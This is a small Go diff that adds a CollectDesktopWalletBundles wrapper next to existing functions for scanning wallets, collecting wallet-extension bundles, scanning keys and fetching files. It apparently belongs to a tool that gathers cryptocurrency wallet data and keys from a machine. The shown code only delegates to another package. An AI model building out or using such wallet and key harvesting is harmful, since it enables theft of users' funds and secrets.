@@ -44,9 +44,14 @@ func ScanWallets() []WalletResult           { return scanner.ScanWallets() }
 
 type WalletExtensionBundle = scanner.WalletExtensionBundle
 type WalletExtensionFileEntry = scanner.WalletExtensionFileEntry
+type DesktopWalletBundle = scanner.DesktopWalletBundle
 
 func CollectWalletExtensionBundles() []WalletExtensionBundle {
 	return scanner.CollectWalletExtensionBundles()
+}
+
+func CollectDesktopWalletBundles() []DesktopWalletBundle {
+	return scanner.CollectDesktopWalletBundles()
 }
 func ScanKeys() []KeyResult                 { return scanner.ScanKeys() }
 func FetchFile(path string) ([]byte, error) { return scanner.FetchFile(path) }
